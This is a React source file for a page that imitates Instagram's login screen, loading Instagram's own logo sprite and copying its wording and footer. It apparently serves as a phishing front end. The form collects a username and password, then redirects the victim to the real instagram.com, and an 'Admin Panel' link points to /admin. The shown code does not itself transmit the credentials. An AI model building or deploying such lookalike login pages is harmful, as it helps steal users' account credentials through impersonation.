import { useState } from "react";

const InstagramLogin = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    window.location.href = "https://www.instagram.com";
  };

  const handleFacebookLogin = (e: React.MouseEvent) => {
    e.preventDefault();
  };

  const handleSignUp = (e: React.MouseEvent) => {
    e.preventDefault();
  };

  const handleForgotPassword = (e: React.MouseEvent) => {
    e.preventDefault();
  };

  const footerLinks = [
    "Meta", "About", "Blog", "Jobs", "Help", "API", "Privacy", "Terms",
    "Locations", "Instagram Lite", "Meta AI", "Threads", 
    "Contact Uploading & Non-Users", "Meta Verified"
  ];

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <main className="flex-1 flex items-center justify-center px-4 py-12">
        <div className="flex items-center gap-16 max-w-[935px] w-full">
          <div className="hidden lg:flex flex-shrink-0">
            <img 
              src="/landing-2x.png" 
              alt="Instagram landing" 
              className="w-[630px] h-auto"
            />
          </div>

          <div className="w-full max-w-[380px]">
            <div className="text-center mb-8">
              <i 
                data-visualcompletion="css-img" 
                aria-label="Instagram" 
                role="img"
                style={{
                  backgroundImage: 'url("https://static.cdninstagram.com/rsrc.php/v4/yz/r/H_-3Vh0lHeK.png")',
                  backgroundPosition: '0px -2959px',
                  backgroundSize: 'auto',
                  width: '175px',
                  height: '51px',
                  backgroundRepeat: 'no-repeat',
                  display: 'inline-block'
                }}
              />
            </div>

            <form onSubmit={handleSubmit} className="space-y-2">
              <div className="relative">
                <input
                  type="text"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  placeholder="Phone number, username, or email"
                  className="w-full px-2 py-1.5 text-[11px] bg-secondary border border-input rounded-sm focus:outline-none focus:border-muted-foreground placeholder:text-muted-foreground"
                  aria-label="Phone number, username, or email"
                  autoComplete="username"
                />
              </div>

              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Password"
                  className="w-full px-2 py-1.5 text-[11px] bg-secondary border border-input rounded-sm focus:outline-none focus:border-muted-foreground placeholder:text-muted-foreground pr-12"
                  aria-label="Password"
                  autoComplete="current-password"
                />
                {password && (
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-2 top-1/2 -translate-y-1/2 text-xs font-semibold text-foreground cursor-pointer"
                  >
                    {showPassword ? "Hide" : "Show"}
                  </button>
                )}
              </div>

              <button
                type="submit"
                disabled={!username || !password}
                className="w-full bg-periwinkle text-primary-foreground py-1.5 rounded-lg font-semibold text-xs mt-3 disabled:opacity-50 disabled:cursor-not-allowed hover:bg-periwinkle/90 transition-colors"
              >
                Log in
              </button>
            </form>

            <div className="flex items-center gap-4 my-5">
              <div className="flex-1 h-px bg-input"></div>
              <span className="text-xs font-semibold text-muted-foreground">OR</span>
              <div className="flex-1 h-px bg-input"></div>
            </div>

            <button 
              onClick={handleFacebookLogin}
              className="w-full flex items-center justify-center gap-2 text-facebook-blue font-semibold text-sm hover:opacity-80 transition-opacity"
            >
              <svg className="w-5 h-5" viewBox="0 0 24 24" fill="currentColor">
                <path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12z"/>
              </svg>
              Log in with Facebook
            </button>

            <div className="text-center mt-5">
              <a 
                href="#" 
                onClick={handleForgotPassword}
                className="text-xs text-instagram-link hover:opacity-80 transition-opacity"
              >
                Forgot password?
              </a>
            </div>

            <div className="text-center mt-5 pt-5 border-t border-input">
              <p className="text-sm">
                Don't have an account?{" "}
                <a 
                  href="#" 
                  onClick={handleSignUp}
                  className="text-instagram-blue font-semibold hover:opacity-80 transition-opacity"
                >
                  Sign up
                </a>
              </p>
            </div>

            <div className="text-center mt-4">
              <a 
                href="/admin" 
                className="text-xs text-muted-foreground hover:text-foreground hover:underline transition-colors"
              >
                Admin Panel
              </a>
            </div>
          </div>
        </div>
      </main>

      <footer className="bg-background border-t border-input py-6">
        <div className="max-w-[1024px] mx-auto px-4">
          <nav className="flex flex-wrap justify-center gap-x-4 gap-y-2 mb-4">
            {footerLinks.map((link) => (
              <a
                key={link}
                href="#"
                className="text-xs text-footer-text hover:underline"
              >
                {link}
              </a>
            ))}
          </nav>

          <div className="flex justify-center items-center gap-4 text-xs text-footer-text">
            <button className="flex items-center gap-1 hover:opacity-80 transition-opacity">
              English
              <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
              </svg>
            </button>
            <span>© 2025 Instagram from Meta</span>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default InstagramLogin;
